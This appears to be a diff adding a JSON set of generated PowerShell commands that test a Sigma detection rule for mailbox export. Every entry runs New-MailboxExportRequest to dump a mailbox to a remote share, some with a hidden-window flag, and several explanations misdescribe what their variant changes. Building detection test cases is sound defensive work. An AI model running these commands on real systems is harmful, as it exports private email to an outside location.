@@ -1,0 +1,24 @@
+```json
+[
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox user@example.com -FilePath \\\\$\\share\\export.pst\"",
+    "explanation": "This command simulates the suspicious use of the New-MailboxExportRequest cmdlet to export a mailbox to a remote share, as detected by the Sigma rule. It includes all required elements for detection."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox user@example.com -FilePath \\\\$\\share\\export.pst\" -WindowStyle Hidden",
+    "explanation": "This command adds an optional argument (-WindowStyle Hidden) that does not affect the detection logic but demonstrates how arguments can be extended while still matching the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox user@example.com -FilePath \\\\$\\share\\export.pst\" -NoProfile",
+    "explanation": "This command omits unnecessary elements and adds a common PowerShell flag (-NoProfile) to demonstrate reordering and omission techniques while still matching the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox user@example.com -FilePath \\\\$\\share\\export.pst\" -Command \"\"",
+    "explanation": "This command uses insertion of an additional empty -Command parameter, which is parsed correctly and does not affect the detection logic."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox user@example.com -FilePath \\\\$\\share\\export.pst\" -Command ''",
+    "explanation": "This command uses substitution of an empty string for the second -Command parameter, demonstrating safe mutation techniques while still matching the Sigma rule."
+  }
+]
+```
